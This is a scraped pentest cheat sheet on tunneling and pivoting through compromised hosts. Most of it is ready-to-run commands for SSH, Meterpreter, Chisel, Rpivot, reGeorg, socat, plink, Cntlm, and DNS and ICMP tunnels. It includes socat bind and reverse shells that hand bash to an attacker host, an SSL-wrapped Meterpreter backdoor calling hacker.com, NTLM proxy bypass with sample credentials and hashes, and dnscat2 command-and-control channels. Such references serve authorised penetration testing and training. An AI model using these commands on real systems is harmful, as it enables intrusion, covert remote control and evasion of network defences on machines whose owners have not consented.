https://hacksheets.in/all-categories/network-main/tunneling-and-port-forwarding/

# **SSH**<ins></ins>

SSH graphical connection (X)

|     |     |
| --- | --- |
| 1   | `ssh` `-Y -C <user>@<ip>` `#-Y is less secure but faster than -X` |

## Local Port2Port<ins></ins>

Open new Port in SSH Server –> Other port

|     |     |
| --- | --- |
| 1   | `ssh` `-R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1` `#Local port 1521 accessible in port 10521 from everywhere` |

|     |     |
| --- | --- |
| 1   | `ssh` `-R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1` `#Remote port 1521 accessible in port 10521 from everywhere` |

## Port2Port<ins></ins>

Local port –> Compromised host (SSH) –> Third_box:Port

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `ssh` `-i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]` `#This way the terminal is still in your host`<br><br>`#Example`<br><br>`sudo` `ssh` `-L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>` |

## Port2hostnet (proxychains)<ins></ins>

Local Port –> Compromised host(SSH) –> Wherever

|     |     |
| --- | --- |
| 1   | `ssh` `-f -N -D <attacker_port> <username>@<ip_compromised>` `#All sent to local port will exit through the compromised server (use as proxy)` |

## VPN-Tunnel<ins></ins>

You need  **root in both devices**  (as you are going to create new interfaces) and the sshd config has to allow root login:  `PermitRootLogin yes`  `PermitTunnel yes`

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `ssh` `username@server -w any:any` `#This wil create Tun interfaces in both devices`<br><br>`ip addr add 1.1.1.2``/32` `peer 1.1.1.1 dev tun0` `#Client side VPN IP`<br><br>`ip addr add 1.1.1.1``/32` `peer 1.1.1.2 dev tun0` `#Server side VPN IP` |

Enable forwarding in Server side

|     |     |
| --- | --- |
| 1<br><br>2 | `echo` `1 >` `/proc/sys/net/ipv4/ip_forward`<br><br>`iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE` |

Set new route on client side

|     |     |
| --- | --- |
| 1   | `route add -net 10.0.0.0``/16` `gw 1.1.1.1` |

# SSHUTTLE<ins></ins>

You can  **tunnel**  via  **ssh**  all the  **traffic**  to a  **subnetwork**  through a host. Example, forwarding all the traffic going to 10.10.10.0/24

|     |     |
| --- | --- |
| 1<br><br>2 | `pip` `install` `sshuttle`<br><br>`sshuttle -r user@host 10.10.10.10``/24` |

# Meterpreter<ins></ins>

## Port2Port<ins></ins>

Local port –> Compromised host (active session) –> Third_box:Port

|     |     |
| --- | --- |
| 1<br><br>2 | `# Inside a meterpreter session`<br><br>`portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>` |

## Port2hostnet (proxychains)<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3<br><br>4<br><br>5 | `background``# meterpreter session`<br><br>`route add <IP_victim> <Netmask> <Session>` `# (ex: route add 10.10.10.14 255.255.255.0 8)`<br><br>`use auxiliary``/server/socks_proxy`<br><br>`run` `#Proxy port 1080 by default`<br><br>`echo` `"socks4 127.0.0.1 1080"` `>` `/etc/proxychains``.conf` `#Proxychains` |

Another way:

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8<br><br>9<br><br>10 | `background` `#meterpreter session`<br><br>`use post``/multi/manage/autoroute`<br><br>`set` `SESSION <session_n>`<br><br>`set` `SUBNET <New_net_ip>` `#Ex: set SUBNET 10.1.13.0`<br><br>`set` `NETMASK <Netmask>`<br><br>`run`<br><br>`use auxiliary``/server/socks_proxy`<br><br>`set` `VERSION 4a`<br><br>`run` `#Proxy port 1080 by default`<br><br>`echo` `"socks4 127.0.0.1 1080"` `>` `/etc/proxychains``.conf` `#Proxychains` |

# reGeorg<ins></ins>

<ins>https://github.com/sensepost/reGeorg</ins>

You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp

|     |     |
| --- | --- |
| 1   | `python reGeorgSocksProxy.py -p 8080 -u http:``//upload``.sensepost.net:8080``/tunnel/tunnel``.jsp` |

# Chisel<ins></ins>

You can download it from the releases page of  <ins>https://github.com/jpillora/chisel</ins>  You need to use the  **same version for client and server**

## socks<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `.``/chisel` `server -p 8080 --reverse` `#Server`<br><br>`.``/chisel-x64``.exe client 10.10.14.3:8080 R:socks` `#Client`<br><br>`#And now you can use proxychains with port 1080 (default)` |

## Port forwarding<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2 | `.``/chisel_1``.7.6_linux_amd64 server -p 12312 --reverse`<br><br>`.``/chisel_1``.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505` |

# Rpivot<ins></ins>

<ins>https://github.com/klsecservices/rpivot</ins>

Reverse tunnel. The tunnel is started from the victim. A socks4 proxy is created on 127.0.0.1:1080

|     |     |
| --- | --- |
| 1   | `attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080` |

|     |     |
| --- | --- |
| 1   | `victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999` |

Pivot through  **NTLM proxy**

|     |     |
| --- | --- |
| 1   | `victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd` |

|     |     |
| --- | --- |
| 1   | `victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45` |

# **Socat**<ins></ins>

<ins>https://github.com/andrew-d/static-binaries</ins>

## Bind shell<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2 | `victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:``bash``,pty,stderr,setsid,sigint,sane`<br><br>``attacker> socat FILE:` ```tty``` `,raw,```echo``=0 TCP:<victim_ip>:1337` |

## Reverse shell<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2 | ``attacker> socat TCP-LISTEN:1337,reuseaddr FILE:` ```tty``` `,raw,```echo``=0`<br><br>`victim> socat TCP4:<attackers_ip>:1337 EXEC:``bash``,pty,stderr,setsid,sigint,sane` |

## Port2Port<ins></ins>

|     |     |
| --- | --- |
| 1   | `socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &` |

## Port2Port through socks<ins></ins>

|     |     |
| --- | --- |
| 1   | `socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678` |

## Meterpreter through SSL Socat<ins></ins>

|     |     |
| --- | --- |
| 1<br><br>2 | `#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port`<br><br>`attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333` |

|     |     |
| --- | --- |
| 1<br><br>2 | `victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5\|TCP:hacker.com:443,connect-timeout=5`<br><br>`#Execute the meterpreter` |

You can bypass a  **non-authenticated proxy**  executing this line instead of the last one in the victim’s console:

|     |     |
| --- | --- |
| 1   | `OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5\|PROXY:hacker.com:443,connect-timeout=5\|TCP:proxy.lan:8080,connect-timeout=5` |

<ins>https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/</ins>

## SSL Socat Tunnel<ins></ins>

**/bin/sh console**

Create certificates in both sides: Client and Server

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6 | `# Execute this commands in both sides`<br><br>`FILENAME=socatssl`<br><br>`openssl genrsa -out $FILENAME.key 1024`<br><br>`openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt`<br><br>`cat` `$FILENAME.key $FILENAME.crt >$FILENAME.pem`<br><br>`chmod` `600 $FILENAME.key $FILENAME.pem` |

|     |     |
| --- | --- |
| 1<br><br>2 | `attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:``/bin/sh`<br><br>`victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt` |

## Remote Port2Port<ins></ins>

Connect the local SSH port (22) to the 443 port of the attacker host

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `attacker>` `sudo` `socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr` `#Redirect port 2222 to port 443 in localhost`<br><br>`victim>` `while` `true``;` `do` `socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ;` `done` `# Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22`<br><br>`attacker>` `ssh` `localhost -p 2222 -l www-data -i vulnerable` `#Connects to the ssh of the victim` |

# Plink.exe<ins></ins>

It’s like a console PuTTY version ( the options are very similar to a ssh client).

As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:

|     |     |
| --- | --- |
| 1<br><br>2 | `echo` `y \| plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>`<br><br>`echo` `y \| plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41` `#Local port 9090 to out port 9090` |

# NTLM proxy bypass<ins></ins>

The previously mentioned tool:  **Rpivot**  **OpenVPN**  can also bypass it, setting these options in the configuration file:

|     |     |
| --- | --- |
| 1   | `http-proxy <proxy_ip> 8080 <file_with_creds> ntlm` |

## Cntlm<ins></ins>

<ins>http://cntlm.sourceforge.net/</ins>

It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port. Example that forward port 443

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3<br><br>4<br><br>5 | `Username Alice`<br><br>`Password P@ssw0rd`<br><br>`Domain CONTOSO.COM`<br><br>`Proxy 10.0.0.10:8080`<br><br>`Tunnel 2222:<attackers_machine>:443` |

Now, if you set for example in the victim the  **SSH**  service to listen in port 443. You can connect to it through the attacker port 2222. You could also use a  **meterpreter**  that connects to localhost:443 and the attacker is listening in port 2222.

# YARP<ins></ins>

A reverse proxy create by Microsoft. You can find it here:  <ins>https://github.com/microsoft/reverse-proxy</ins>

# DNS Tunneling<ins></ins>

## Iodine<ins></ins>

<ins>https://code.kryo.se/iodine/</ins>

Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com`<br><br>`victim> iodine -f -P P@ssw0rd tunneldomain.com -r`<br><br>`#You can see the victim at 1.1.1.2` |

The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:

|     |     |
| --- | --- |
| 1   | `ssh` `<user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080` |

## DNSCat2<ins></ins>

Establishes a C&C channel through DNS. It doesn’t need root privileges.

|     |     |
| --- | --- |
| 1<br><br>2 | `attacker> ruby .``/dnscat2``.rb tunneldomain.com`<br><br>`victim> .``/dnscat2` `tunneldomain.com` |

**Port forwarding with dnscat**

|     |     |
| --- | --- |
| 1<br><br>2 | `session -i <sessions_id>`<br><br>`listen [lhost:]lport rhost:rport` `#Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host` |

### Change proxychains DNS<ins></ins>

Proxychains intercepts  `gethostbyname`  libc call and tunnels tcp DNS request through the socks proxy. By  **default**  the  **DNS**  server that proxychains use is  **4.2.2.2**  (hardcoded). To change it, edit the file:  */usr/lib/proxychains3/proxyresolv*  and change the IP. If you are in a  **Windows environment**  you could set the IP of the  **domain controller**.

# Tunnels in Go<ins></ins>

<ins>https://github.com/hotnops/gtunnel</ins>

# ICMP Tunneling<ins></ins>

## Hans<ins></ins>

<ins>https://github.com/friedrich/hans</ins>  <ins>https://github.com/albertzak/hanstunnel</ins>

Root is needed in both systems to create tun adapters and tunnels data between them using ICMP echo requests.

|     |     |
| --- | --- |
| 1<br><br>2<br><br>3 | `.``/hans` `-``v` `-f -s 1.1.1.1 -p P@ssw0rd` `#Start listening (1.1.1.1 is IP of the new vpn connection)`<br><br>`.``/hans` `-f -c <server_ip> -p P@ssw0rd -``v`<br><br>`ping` `1.1.1.100` `#After a successful connection, the victim will be in the 1.1.1.100` |

# Other tools to check<ins></ins>

- <ins>https://github.com/securesocketfunneling/ssf</ins>
- <ins>https://github.com/z3APA3A/3proxy</ins>
- <ins>https://github.com/jpillora/chisel</ins>